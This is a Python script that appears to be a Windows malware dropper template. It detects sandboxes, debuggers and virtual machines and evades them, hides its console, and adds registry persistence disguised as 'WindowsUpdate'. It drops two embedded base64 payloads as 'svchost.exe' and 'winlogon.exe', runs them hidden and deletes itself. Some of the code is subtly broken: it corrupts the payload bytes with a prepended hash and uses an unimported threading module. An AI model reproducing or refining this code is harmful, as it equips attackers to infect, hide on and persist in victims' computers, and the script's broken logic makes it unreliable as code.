import os, sys, subprocess, tempfile, base64, time, ctypes, random, hashlib, winreg

def is_sandbox():
    try:
        import psutil
        if psutil.virtual_memory().total < 4 * 1024**3:
            return True
        if psutil.cpu_count() < 2:
            return True
    except:
        pass
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
    except:
        pass
    try:
        if os.path.exists("C:\\Program Files\\VMware") or os.path.exists("C:\\Program Files\\VirtualBox"):
            return True
    except:
        pass
    return False

if is_sandbox():
    time.sleep(600)
    sys.exit(0)

def extract_and_run(data, fname):
    try:
        p = os.path.join(tempfile.gettempdir(), fname + ".exe")
        with open(p, 'wb') as f:
            f.write(data)
        subprocess.Popen([p], creationflags=subprocess.CREATE_NO_WINDOW)
        time.sleep(0.5)
    except:
        pass

def add_persistence():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
    except:
        pass

def self_destruct():
    try:
        if os.path.exists(sys.argv[0]):
            os.remove(sys.argv[0])
    except:
        pass

if __name__ == "__main__":
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    FILE1_B64 = "FILE1_B64_PLACEHOLDER"
    FILE2_B64 = "FILE2_B64_PLACEHOLDER"
    
    try:
        add_persistence()
        
        d1 = base64.b64decode(FILE1_B64)
        d2 = base64.b64decode(FILE2_B64)
        
        salt = str(random.randint(1000, 9999)).encode()
        d1 = hashlib.sha256(d1 + salt).digest() + d1
        d2 = hashlib.sha256(d2 + salt).digest() + d2
        
        extract_and_run(d1, "svchost")
        extract_and_run(d2, "winlogon")
        
        threading.Thread(target=self_destruct, daemon=True).start()
    except:
        pass
    sys.exit()